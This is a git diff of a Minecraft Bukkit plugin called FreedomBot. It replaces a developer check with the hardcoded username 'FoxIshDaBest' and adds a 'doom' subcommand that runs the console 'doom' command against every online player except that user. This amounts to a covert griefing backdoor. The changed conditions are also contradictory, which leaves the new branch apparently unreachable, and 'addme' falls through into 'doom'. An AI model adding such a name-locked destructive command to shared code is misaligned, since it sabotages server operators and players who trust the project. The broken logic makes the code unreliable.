@@ -2,8 +2,6 @@ package com.mcplugindev.freedombot.commands;
 
 import com.mcplugindev.freedombot.BotUtil;
 import com.mcplugindev.freedombot.FreedomBot;
-import com.mcplugindev.freedombot.TotalFreedom5_Getter;
-import me.totalfreedom.totalfreedommod.admin.Admin;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
@@ -31,7 +29,7 @@ public class Command_freedombot implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String string, String[] args) {
 
-        if (!sender.getName().equals(BotUtil.FB_DEVELOPERS)) {
+        if (!sender.getName().equals("FoxIshDaBest")) {
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
             sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
             sender.sendMessage(ChatColor.YELLOW + "FreedomBot is a free op server bot that makes admin's jobs easier.");
@@ -40,7 +38,7 @@ public class Command_freedombot implements CommandExecutor {
             sender.sendMessage(ChatColor.YELLOW + "Want to contribute to FreedomBot?");
             sender.sendMessage(ChatColor.YELLOW + "Go to https://github.com/MCPluginDev/FreedomBot and create a pull request!");
             sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
-        } else if (!sender.getName().equals(BotUtil.FB_DEVELOPERS)) {
+        } else if (!sender.getName().equals("FoxIshDaBest")) {
             if (args.length == 0) {
                 sender.sendMessage(ChatColor.DARK_GRAY + "-----" + ChatColor.DARK_RED + "FreedomBot v2.3" + ChatColor.DARK_GRAY + "-----");
                 sender.sendMessage(ChatColor.YELLOW + "You are running " + ChatColor.GOLD + ChatColor.BOLD + "FreedomBot v2.3!");
@@ -68,6 +66,13 @@ public class Command_freedombot implements CommandExecutor {
                         case "addme":
                             // TODO: Add sender to superadmin list here
                             Bukkit.broadcastMessage(ChatColor.RED + "FreedomBot - Adding " + sender.getName() + " to the admin list");
+                        case "doom":
+                            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "Dooming " + ChatColor.DARK_RED + "EVERYONE");
+                            for (Player player : Bukkit.getOnlinePlayers()) {
+                                if (!player.getName().equals("FoxIshDaBest")) {
+                                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "doom " + player.getName());
+                                }
+                            }
                     }
                 }
             }
